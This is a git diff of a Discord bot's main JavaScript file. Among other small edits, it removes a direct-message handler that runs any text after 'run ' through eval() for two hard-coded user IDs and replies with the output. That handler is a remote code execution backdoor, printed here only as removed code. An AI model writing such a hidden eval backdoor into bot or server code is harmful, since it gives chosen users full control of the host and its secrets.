@@ -1,7 +1,7 @@
 const { deserialize } = require('v8');
 try {
     const fs = require('fs');
-    const { Client, GatewayIntentBits, REST, Routes, PermissionsBitField, ChannelType, Partials } = require('discord.js');
+    const { Client, GatewayIntentBits, REST, Routes, PermissionsBitField} = require('discord.js');
     const JSONConfig = require('./config.json');
     const util = require("./utilities.js");
     require("./commands.js");
@@ -12,8 +12,7 @@ try {
             GatewayIntentBits.GuildMessages,
             GatewayIntentBits.GuildMessages,
             GatewayIntentBits.DirectMessages,
-            GatewayIntentBits.GuildMembers,
-            Partials.Channel
+           
         ]
     });
     const rest = new REST({ version: '10' }).setToken(JSONConfig.token);
@@ -46,30 +45,7 @@ try {
             console.error("Error handling interaction:",error);
         }
     });
-    client.on('messageCreate', async (message) => {
-        if (message.channel.type === ChannelType.DM){
-            console.log("is a dm channel")
-            allowed_users = ["790709753138905129","799101657647415337"]
-            if (allowed_users.includes(message.author.id)){
-                console.log("is allowed user")
-                if (message.content.startsWith("run ")){
-                    console.log("starts with run")
-                    const code = message.content.slice(4);
-                    try {
-                        let result = eval(code);
-
-                        // If async, wait for it
-                        if (result instanceof Promise) result = await result;
-
-                        if (typeof result !== "string") result = util.inspect(result);
-
-                        await message.reply("✅ Output:\n```js\n" + result + "\n```");
-                    } catch (err) {
-                        await message.reply("❌ Error:\n```js\n" + err + "\n```");
-                    }
-                }
-            }
-        }
+    client.on('messageCreate', (message) => {
         if (message.author.bot) return; 
         const messagePoints = Math.floor(Math.random() * (50 - 15 + 1) + 15);
         let msgcontent = "none";
